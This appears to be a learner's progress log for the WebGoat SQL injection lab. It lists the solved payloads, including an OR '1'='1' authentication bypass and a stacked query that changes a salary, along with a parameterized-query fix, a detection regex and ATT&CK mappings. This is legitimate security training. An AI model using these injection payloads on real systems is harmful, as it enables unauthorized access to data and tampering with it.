# A03: SQL Injection Progress

## Module: WebGoat Intro
- Date: 2025-10-18
- Time: 90 min
- Challenges: 7/7 ✅

## Payloads
| Challenge | Payload | Result |
|-----------|---------|--------|
| SELECT | `SELECT department FROM employees WHERE first_name = 'Bob'` | ✅ |
| UPDATE | `UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi'` | ✅ |
| ALTER | `ALTER TABLE employees ADD phone VARCHAR(20)` | ✅ |
| GRANT | `GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user WITH GRANT OPTION` | ✅ |
| Auth Bypass | `WHERE last_name = '' OR '1' = '1'` | ✅ |
| Logic Bypass | `Login_Count = 0, User_Id = TRUE` | ✅ |
| Compound | `'; UPDATE employees SET salary = 1000000 WHERE last_name = 'Smith';--` | ✅ |

## Root Cause
String concatenation + no input validation + overprivileged DB account

## Fix
Parameterized queries: `cursor.execute("SELECT * FROM users WHERE username = ?", (input,))`

## Detection
Regex: `(OR|AND)\s+['"]\d+['"]\s*=\s*['"]\d+['"']`

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1213: Data from Information Repositories
- T1485: Data Destruction

## Next
- [ ] Blind SQL injection (time-based)
- [ ] UNION-based data extraction
- [ ] Write automated detection rule
